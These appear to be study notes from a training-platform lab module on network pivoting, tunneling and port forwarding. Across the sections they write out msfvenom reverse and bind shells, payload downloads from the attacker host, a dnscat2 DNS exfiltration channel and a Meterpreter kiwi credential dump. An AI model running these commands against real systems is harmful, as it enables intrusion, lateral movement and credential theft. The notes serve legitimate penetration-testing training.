# Academy - Pivoting, Tunneling, and Port Forwarding

## Table of Contents
- [Basics](#basics)
- [The Networking Behind Pivoting](#the-networking-behind-pivoting)  
    - IP Addressing & NICs
    - Routing
- [Socks Overview](#socks-overview)
- [Dynamic Port Forwarding with SSH](#dynamic-port-forwarding-with-ssh-and-socks-tunneling)  
    - Dynamic Port Forwarding with SSH Lab
- [Back to Vanilla Port Forwarding](#aside-back-to-vanilla-port-forwarding)  
- [Reverse Port Forwarding with SSH](#remotereverse-port-forwarding-with-ssh)  
- [Meterpreter Tunneling and Port Forwarding](#meterpreter-tunneling-and-port-forwarding)  
    - Ping Sweeping
    - MSF SOCKS Proxy
    - AutoRoute
    - Meterpreter Port Forwarding
    - Meterpreter Reverse Port Forwarding
- [Socat Redirection with a Reverse Shell](#socat-redirection-with-a-reverse-shell)  
- [Socat Redirection with a Bind Shell](#socat-redirection-with-a-bind-shell)  
- [SSH for Windows: plink.exe](#ssh-for-windows-plinkexe)  
- [SSH Pivoting with SSHuttle](#ssh-pivoting-with-sshuttle)  
- [Web Server Pivoting with Rpivot](#web-server-pivoting-with-rpivot)  
- [Port Forwarding with Windows Netsh](#port-forwarding-with-windows-netsh)  
- [DNS Tunneling with Dnscat2](#dns-tunneling-with-dnscat2)  
- [Chisel](#chisel)
- [ICMP Tunneling with SOCKS](#icmp-tunneling-with-socks)  
- [RDP and SOCKS Tunneling with SocksOverRDP](#rdp-and-socks-tunneling-with-socksoverrdp)  
- [Skills Assessment](#skills-assessment)

<br />

## Basics

**Pivoting** is essentially the idea of moving to other networks through a compromised host to find more targets on different network segments  

Pivot host, proxy, foothold, beach head system, and jump host, are all terms that are used to describe a comprimised host that we can use to pivot to a previously unreachable network segment  

**Tunneling** is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it  

<br />

## The Networking Behind Pivoting

### IP Addressing & NICs

The IP address is assigned in software and usually obtained automatically from a DHCP server. It is also common to see computers with statically assigned IP addresses.  

Whether assigned dynamically or statically, the IP address is assigned to a Network Interface Controller (NIC). A computer can have multiple NICs (physical and virtual), meaning it can have multiple IP addresses assigned, allowing it to commmunicate on various networks.  

Each interface in the output of `ifconfig` (`ipconfig` if Windows) is a NIC. 

### Routing

`netstat -r` shows the routing table on a linux machine  
Example: 
```bash
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         178.62.64.1     0.0.0.0         UG        0 0          0 eth0
10.10.10.0      10.10.14.1      255.255.254.0   UG        0 0          0 tun0
10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
10.106.0.0      0.0.0.0         255.255.240.0   U         0 0          0 eth1
10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
178.62.64.0     0.0.0.0         255.255.192.0   U         0 0          0 eth0
```
In this case, a packet destined for the host 10.129.10.25 will be forwarded out of the `tun0` interface  
This is because of the second to last line of the routing table  

<br />

## SOCKS Overview

SOCKS, which stands for Socket Secure, is a network protocol that faciliates communications with servers by routing network traffic on behalf of a client. SOCKS is designed to route any type of traffic generated by any protocol or program.  

A SOCKS proxy server creates a TCP connection to another server on the client's behalf, then exchanges network packets beterrn the client and the actual server. The SOCKS proxy server doesn't interpret the network traffic between client and server in any way. 

SOCKS4 doesn't support authentication, while SOCKS5 supports a variety of authentication methods. SOCKS4 doesn't support UDP proxies, while SOCKS5 does

<br />

## Dynamic Port Forwarding with SSH and SOCKS tunneling

Port forwarding allows us to redirect a communication request from one port to another.  
Basic port forwardnig in SSH is done with the `-L` flag:  
```bash
ssh -L local_port:destination_server_ip:remote_port ssh_server_hostname
``` 
This means, use `ssh_server_hostname` to forward all local requests to `local_port` to `destination_server_ip:remote_port`  
If you use `localhost` as the `destination_server_ip` the ssh server's ip address will be used as the `destination_server_ip`  
Example:  
`ssh -L 1234:localhost:3306 ubuntu@10.129.202.64`  
The SSH server on the ubuntu server will forward all data we send to port 1234 to the ubuntu server's port 3306  

### Dynamic Port Forwarding Lab

We have the credentials for an Ubuntu server running an ssh server  
The Ubuntu server has two NICs, one which is to the network that we are connected to, and a different one. We don't know what is on the second network.  

SSH has a feature called **dynamic port forwarding**, which leverages the SOCKS protocol. In this configuration, SSH acts like a SOCKS proxy, relaying all relevant traffic through the SSH connection.  

```bash
ssh -D 9050 ubuntu@10.129.202.64
```
Is how we set up dynamic port forwarding on the ubuntu server's SSH server. **proxychains** is a tool which will allow us to route any applications packets over a specified port. proxychains can also be used to hide the IP address of the requesting host, since the receiving host will only see the IP of the pivot host.  

proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS, TOR, or HTTP/HTTP5 proxies.  

To inform proxychains to use 9050 we add `socks4 127.0.0.1 9050` to the last line of `/etc/proxychains.conf`  

Now we can start nmap with proxychains:  
`proxychains nmap -v -sn 172.16.5.1-200`  
Because we have dynamic port forwarding configured on the SSH server, all of our requests to port 9050 are being forwarded to the ubuntu server, which then routes them to the appropriate interface (using its routing table)  
All of nmap's traffic is being forwarded to 9050 because of proxychains  
`-200` instructs nmap to scan the first 200 hosts on that network. This takes a long time, but eventually we find the host 172.16.5.19  
This host has an rdp service running, which we can connect to with:  
`proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`  

<br />

## Aside: Back to Vanilla Port Forwarding

This is not part of the module, but I thought it worth it to point out here.  
Now that we know an rdp service is running (on port 3389) on 172.16.5.19, which is a box on the Ubuntu server's other network, we can actually use a 'vanilla' ssh port forward to get our RDP session  
To do this, instruct the ssh server on the ubuntu server to redirect all packets sent to 8687 on our attack box to 172.16.5.19:3389 with:  
```bash
ssh -L 8687:172.16.5.19:3389 ubuntu@10.129.236.129
```
Now, when we run `xfreerdp /v:localhost:8687 /u:victor /p:pass@123`, the ubuntu ssh server forwards these packets to 172.16.5.19:3389, and we get an RDP session

<br />

## Remote/Reverse Port Forwarding with SSH

The idea here is to continue the last example, to get a reverse shell from the windows box 172.16.5.19 instead of just an RDP session.  

We can generate a reverse shell with msfvenom:  
`msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o reverseshell.exe LPORT=8080`  

172.16.5.129 is the Ubuntu server's ip for the interface with the network which the Windows target is on. Obtained by running `ifconfig` on the Ubuntu server  

We then scp this reverse shell to the Ubuntu server, host an http server on the Ubuntu server with  
`python3 -m http.server 8686`  

Using the powershell cmdlet Invoke-Webrequest in our RDP session, we can then grab the file on the Windows machine:  
`Invoke-WebRequest -Uri "http://172.16.5.129:8686/reverseshell.exe" -OutFile "C:\Users\victor\reverseshell.exe"`  

What we need now is a way to redirect the requests from the reverse shell to the Ubuntu server on 8080 to our attack machine. We do this with **SSH remote port forwarding**  

`ssh -R 172.16.5.129:8080:<our tun0 ip addr>:8000 ubuntu@10.129.202.64`  
is how we accomplish this  

We can then start msfconsole multi handler on our attack machine with:  
`use exploit/multi/handler`, `set lhost tun0`, `set lport 8080`, `run`  

Running the reverse shell on the target machine gets us a rev shell.

<br />

## Meterpreter Tunneling and Port Forwarding

This is a repeat of the last scenario, but using Metasploit to do everything instead of SSH tunneling  

First, we create a reverse shell for the Ubuntu server to connect back to our attack machine with:  
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<tun0 ip> -f elf -o linux_rev_shell LPORT=8080
```
We can then scp the rev shell to the ubuntu host and chmod +x it, then start a multi-listner in msfconsole with:  
`use exploit/multi/handler`  
`set lhost tun0`  
`set lport 8080`  
`set payload linux/x64/meterpreter/reverse_tcp`  
`run`  
Run the rev shell on the ubuntu box, and we get a meterpreter session

### Ping Sweeping

Next we background the session with `ctrl + z`, run:  
`use post/multi/gather/ping_sweep`  
`set RHOSTS=172.16.5.0/23`  
`set session 1`  
`run`  
To perform a ping sweep of the Ubuntu server's other network  
NOTE: Often Windows boxes have ICMP blocked, and will therefore not respond to a ping sweep. For the sake of this example, it is not blocked, and we find 172.16.5.19  

It seems like ping sweeps are sort of a fickle thing. Running a ping sweep directly from the Ubuntu server with:  
`for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`  
actually finds us an extra host. Apparently its also often beneficial just to run ping sweeps at least twice to see if the results change.  

### MSF SOCKS Proxy

The SOCKS proxy runs as a Metasploit **job**.  
To run it:  
`use auxiliary/server/socks_proxy`  
`set SRVPORT 9050`  
`set SRVHOST tun0`  
`set version 4a`  
`run`  
The `jobs` command will then allow us to see the job running  
Again, to inform proxychains to use 9050 we add `socks4 127.0.0.1 9050` to the last line of `/etc/proxychains.conf`  
Note: Depending on the version the SOCKS server is running, we may occasionally need to change socks4 to socks5 in proxychains.conf  

### AutoRoute

This part sort of confused me  
We ran:  
`use post/multi/manage/autoroute`  
`set SESSION 1`  
`set SUBNET 172.16.5.0`  
`run`  
Then `sessions -i 1` to get back to our interactive meterpreter session  
Then `run autoroute -s 172.16.5.0` but I'm not sure if this was necessary  
Then `run autoroute -p` to list all active routes  

### Meterpreter Port Forwarding

**Note**: Be careful with Meterpreter port forwarding; I have run into a lot of bugs. Would reccomend using `chisel` instead  

We ran `portfwd add -l 3300 -p 3389 -r 172.16.5.19` from the meterpreter session to tell the meterpreter session to forward all the packets we send to our attack host's local port 3300 to the remote ip 172.16.5.19 on port 3389.  
Now, if we run:
`xfreerdp /v:localhost:3300 /u:victor /p:pass@123` we get a RDP session  

### Meterpreter Reverse Port Forwarding

`portfwd add -R -l 8081 -p 1234 -L <tun 0 ip>`  
Will create a reverse port forward to forward all connections to port 1234 on the Ubuntu server to port 8081 on our attack box  
We then create a windows reverse meterpreter shell with:  
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ubuntu server's 2nd network ip addr> -f exe -o windows_rev_met.exe LPORT=1234`  
Next, start a listner in MSFconfole with:  
`ctrl + z` to background the session  
`use exploit/multi/handler`  
`set payload windows/x64/meterpreter/reverse_tcp`  
`set LPORT 8081`  
`set LHOST tun0`  
`run`  
Next, get the meterpreter shell to the Windows host (see powershell cmdlet above) and run it  
This never actually worked for me, but I think the problem is somewhere else  

<br />

## Socat Redirection with a Reverse Shell

**Socat** is a bidirectional relay tool that can create pipe sockets between two independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.  

Using the same example as above, we can get our reverse shell using socat:    
`socat TCP4-LISTEN:1234,fork TCP4:<tun0 ip addr>:8687`  
Running this on the ubuntu server will instruct socat to listen on port 1234 and forward all traffic to port 8687 on our attack host. Starting the listener and the shell as before should work (but it doesn't)  

<br />

## Socat Redirection with a Bind Shell

In the case of bind shells, the Windows machine will start a listener and bind to a particular port that we then reach out to

This was not part of the exercise for this one, but I want to point this out; IMO socat redirection is actually the easiest way to get an RDP session on the Windows VM from our attack box. We just run:  
`socat TCP4-LISTEN:3300,fork TCP4:172.16.5.19:3389`  
on the Ubuntu server to instruct it to redirect all incomming connections on port 3300 to 172.16.5.19:3389  
Then, `xfreerdp /v:<ubuntu server ip>:3300 /u:victor /p:pass@123` gets an RDP session  

We can generate a meterpreter bind shell with:  
`msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o bind_shell.exe LPORT=8443`  
Then, move the shell to the windows machine and run it  
Then, create a socat redirect on the Ubuntu server with:  
`socat TCP4-LISTEN:8080,fork TCP4:<windows box ip>:8443`  
This will forward all packets going to 8080 on the ubuntu server to 8443 on the windows box, and vice-versa  
Run a meterpreter bind handler on our attack box with:  
`use exploit/multi/handler`  
`set payload windows/x64/meterpreter/bind_tcp`  
`set RHOST <ubuntu server ip>`  
`set LPORT 8080`  
`run`  
And we get a shell (this one actually worked)  

<br />

## SSH for Windows: plink.exe  

**Plink**, short for PuTTY Link, is a Windows command-line SSH tool that comes as part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies.  

Another Windows-based tool is called Proxifier and can be used to starts a SOCKS tunnel via the SSH session created with plink.  

I am going to leave this at that. There is more a lot more to it, probably don't need to learn right now  

<br />

## SSH Pivoting with SSHuttle

**sshuttle** is a tool written in Python which removes the need to configure proxychains. The tool only works for pivoting over SSH.  

`sudo apt install sshuttle` to install it  

`sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v`  
Tells sshuttle to create an entry in our iptables to redirect all traffic to the `172.16.5.0/23` network through the pivot host  
With sshuttle running, we can run:  
`nmap -v -sV -p3389 172.16.5.19 -A -Pn`  
and our nmap scan will be routed through the Ubuntu server and properly scan the target host  

<br />

## Web Server Pivoting with Rpivot

**Rpivot** is a reverse SOCKS proxy tool written in Python for SOCKS tunneling  
In this case, our goal is to expose port 80 of a webserver running inside of a network so we can access that webserver's home page from our attack machine  

Similarly to the last example, we have a vulnerable pivot Ubuntu server dual-homed on our network and on the network with the server hosting the webserver  

Download rpivot:  
`sudo git clone https://github.com/klsecservices/rpivot.git`  

rpivot requires python2.7:  
`sudo apt install python2.7`  

Start the server on our attack machine:  
`python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip <tun0 ip>`  

Transfer the entire rpivot directory to the ubuntu server with scp  
Then start the client on the pivot server:  
`python2.7 client.py --server-ip <attack box tun0 ip> --server-port 9999`  
Server should show a connection from the client  

Then, start firefox with `proxychains firefox-esr`  
Navigate to the ip address of the box hosting the webserver on port 80, in this case: `172.16.5.135:80`, and we are able to get served the webpage  

<br />

## Port Forwarding with Windows Netsh

**Netsh** is a Windows command line tool that can help with the network configuration of a particular Windows system. Netsh can be used for a variety of things like; finding routes, viewing the firewall configuration, adding proxies, and creating port forwarding rules  

The scenario in this one is that we have a comprimised Windows box dual-homed on our network and another network, which we can RDP to. We know there is another Windows box on the comprimised box's second network that we also have RDP credentials for. We set up a port forward with Netsh.exe to be able to get a RDP session on the box deeper inside the network  

RDP to the first box:  
`xfreerdp /v:10.129.162.120 /u:htb-student /p:HTB_@cademy_stdnt!`  
Run cmd.exe as administrator  
Run a ping sweep to find the ip address of the deeper target box:  
```Windows
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
We find `172.16.5.19` responds to our ping  
Use netsh.exe to forward all data received on port 8080 to 172.16.5.19:3389  
`netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.162.120 connectport=3389 connectaddress=172.16.5.19`  
Verify the forward got added with:  
`netsh.exe interface portproxy show v4tov4`  
Start a second RDP session from our attack host with:  
`xfreerdp /v:10.129.162.120:8080 /u:victor /p:pass@123`  

<br />

## DNS Tunneling with Dnscat2  

**Dnscat2** is a stealth tool that uses the DNS protocol to send data between two hosts. It uses an encrypted channel and sends data inside TXT records within the DNS protocol. Dnscat2 can be an extreemly stealthy approach to exfiltrate data while evading firewall detections.  

This exercise is just a basic example of communicating between a comprimised Windows host and our attack machine with dnscat2  

`git clone https://github.com/iagox86/dnscat2.git`  
`cd dnscat2/server`  
`sudo gem install bundler`  
`sudo bundle install`  
Start the dnscat2 server:  
`sudo ruby dnscat2.rb --dns host=<tun0 ip>,port=53,domain=inlanefreight.local --no-cache`  
This will spit out a secret key, in our case this was: a78af83054f9f987152538d7587ba336  

Now we need to get the powershell dnscat2 cmdlet to the target:  
`git clone https://github.com/lukebaggett/dnscat2-powershell.git`  
`cd dnscat2-powershell`  
`python3 -m http.server`  
From the target host in powershell:  
```ps
Invoke-WebRequest -Uri "http://10.10.14.47:8000/dnscat2.ps1" -OutFile "C:\Users\htb-student\dnscat2.ps1"  
```

Now we import an run dnscat2 on the target:  
```ps
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.47 -Domain inlanefreight.local -PreSharedSecret a78af83054f9f987152538d7587ba336 -Exec cmd
```
And we should get a connection back on our dnscat2 listener  
Running `?` in the listener console shows us all the commands available to us  
Running `window -i 1` essentially gets us a cmd shell  
Note: everything over dnscat is really slow for obvious reasons, so you have to wait a few seconds for any shell command to give you back a response  

<br />

## Chisel

There is a module on Chisel  
I have moved my documentation of Chisel to a different page ([Chisel_Pivoting.md](../Tooling/Chisel_Pivoting.md))  

<br />

## ICMP Tunneling with SOCKS

ICMP tunneling encapsulates your traffic within ICMP packets. ICMP tunneling only works if ping responses are enabled.  

We use `ptunnel-ng` to create a ICMP tunnel between our Ubuntu server and our attack host  

Installing ptunnel-ng:  
`git clone https://github.com/utoni/ptunnel-ng.git`  
`cd ptunnel-ng`  
`./autogen.sh`  

scp the entire ptunnel-ng directory to the ubuntu server  
On the ubuntu server:  
`sudo ./ptunnel-ng -r<ubuntu server ip> -R22`  
On our attack box:  
`sudo ./ptunnel-ng -p<ubuntu server ip> -l2222 -r<ubuntu server ip> -R22`  
Now we can create an ssh session inside of our ICMP tunnel with:  
`ssh -p2222 -lubuntu 127.0.0.1`  

If you wireshark the traffic, it will all appear to be ICMP traffic which is pretty cool  

We could also do dynamic SSH port forwarding inside of our tunnel with:  
`ssh -D 9050 -p2222 -lubuntu 127.0.0.1`  
Which will allow us to use proxychains however we want  

<br />

## RDP and SOCKS Tunneling with SocksOverRDP

This exercise was supposed to be done with a tool called SocksOverRDP and Proxifier. It got really janky really quick, so I decided to see if I could just use netsh.exe  

There are three different networks in this one. There is a Windows server, server A, dual homed on our network (network 1) and network 2. There is another Windows server, server B, dual homed on network 2 and network 3. There is a third Windows server, server C, which is our target. We have RDP creds for all three servers  

First we RDP to server A and run (as administrator):  
`netsh.exe interface portproxy add v4tov4 listenport=8687 listenaddress=<server A network 1 ip> connectport=8086 connectaddress=<server B network 2 ip>`  

Verify it worked with:  
`netsh.exe interface portproxy show v4tov4`  

Then, RDP to server B from server A and run (as administrator):  
`netsh.exe interface portproxy add v4tov listenport=8086 listenaddress=<server B network 2 ip> connectport=3389 connectaddress=<server C network 3 ip>`  

Now, rdping from our attack host with:  
`xfreersp /v:<server A network 1 ip>:8687 /u:jason /p:WellConnected123!`  
gets us an RDP session all the way to server C  

<br />

## Skills Assessment

This brought together a few of the concepts in the module, and was actually quite hard  

We are given a webshell on an Ubuntu server at `10.129.201.127`  

In the webshell, we can find webadmin user's private rsa key, which enables us to ssh to the ubuntu server as webadmin  

The Ubuntu server is dual homed on a second network with its ip on that network being `172.16.5.15`  

We run an IP sweep of that network from the Ubuntu server ssh session with:  
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
and find `172.16.5.35` is also a host on that network.  
In order to run nmap against that host, we run:  
`ssh -D 9050 -i rsa_priv -N -f webadmin@10.129.201.127`  
to start dynamic SSH port forwarding  

Then;  
`proxychains nmap 172.16.5.35`  
will scan the 35 host  
We can see 3389 is open for RDP connections. Luckily, we found the password for a user `mlefay` on the Ubuntu server, so we should try rdping as him  
To do so:  
```bash
# Setup a local port forward:  
ssh -L 8687:172.16.5.35:3389 -i rsa_priv -N -f webadmin@10.129.201.127  
# Connect to RDP:
xfreerdp /v:127.0.0.1:8687 /u:mlefay /p:'Plain Human work!'
```
Upon connecting to this box, we find it is also dual homed on a second network with the ip address 172.16.6.35 on that network.  

We can do an ipscan of that network from the Windows box with:
```Windows
for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"
```
(We have to run this twice, otherwise it won't work)  
We find that 172.16.6.25 is a running box  

This part was tricky to figure out:  
We need some creds for the user vfrank  
To get those creds, we are going to need a meterpreter session on 35  
Generate a bind shell with msfvenom:  
`msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o bind_shell.exe LPORT=8443`  
  
**This is super helpful for copying stuff to xfreerdp sessions:**  
You can start the session with the /drive parameter, ie:  
`xfreerdp /v:127.0.0.1:8687 /u:mlefay /p:'Plain Human work!' /drive:linux,/tmp`  
And `/tmp` on the attack box will be accessible in the RDP session, as like a mapped network drive  

Run the bind shell on the windows box  
Create a local port forward:  
`ssh -L 1239:172.16.5.35:8443 -i rsa_priv -N -f webadmin@10.129.201.127`  
Start MSF multi handler:  
`use exploit/multi/handler`  
`set payload windows/x64/meterpreter/bind_tcp`  
`set RHOST 127.0.0.1`  
`set LPORT 1239`  
`run`  
Then, in our meterpreter session:  
`load kiwi`  
`getsystem`  
`creds_all`  
And we successfully dump vfrank's password  

Now, setting up to allow ourselves to RDP to `172.16.6.25` from our attack box:  
Create a forward on 35 with (in a cmd prompt as admin):  
`netsh.exe interface portproxy add v4tov listenport=8086 listenaddress=172.16.5.35 connectport=3389 connectaddress=172.16.6.25`  
Then setup another local port forward with:  
`ssh -L 8686:172.16.5.35:8086 -i rsa_priv -N -f webadmin@10.129.201.127`  
Connect with xfreerdp:  
`xfreerdp /v:127.0.0.1:8686 /u:vfrank /p:'Imply wet Unmasked!'`  
and we get an RDP session all the way to `172.16.6.25`  
